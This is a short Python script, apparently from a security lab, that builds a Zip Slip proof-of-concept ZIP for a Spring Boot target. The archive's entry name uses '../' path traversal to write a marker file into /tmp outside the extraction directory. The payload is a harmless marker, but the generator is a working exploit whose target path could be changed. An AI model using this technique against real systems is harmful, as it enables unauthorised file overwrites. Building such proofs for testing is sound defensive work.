"""Build a harmless Spring Boot Zip Slip proof-of-concept archive."""

import argparse
import io
from pathlib import Path
import zipfile


DEFAULT_MARKER = "ZIP_SLIP_SPRING_BOOT_PROOF_OF_CONCEPT"
TARGET = "../../../../tmp/zip-slip-spring-boot-proof.txt"


def build_payload(marker: str = DEFAULT_MARKER) -> bytes:
    """Create a ZIP that writes a marker outside the extraction directory."""
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as bundle:
        # Traversal is intentional and limited to this isolated lab.
        bundle.writestr(TARGET, marker + "\n")
    return archive.getvalue()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--marker",
        default=DEFAULT_MARKER,
        help="Text written to the proof file",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path(__file__).with_name("exploit.zip"),
        help="Output ZIP path",
    )
    args = parser.parse_args()

    args.output.write_bytes(build_payload(args.marker))
    print(f"[OK] Exported payload to {args.output}")


if __name__ == "__main__":
    main()
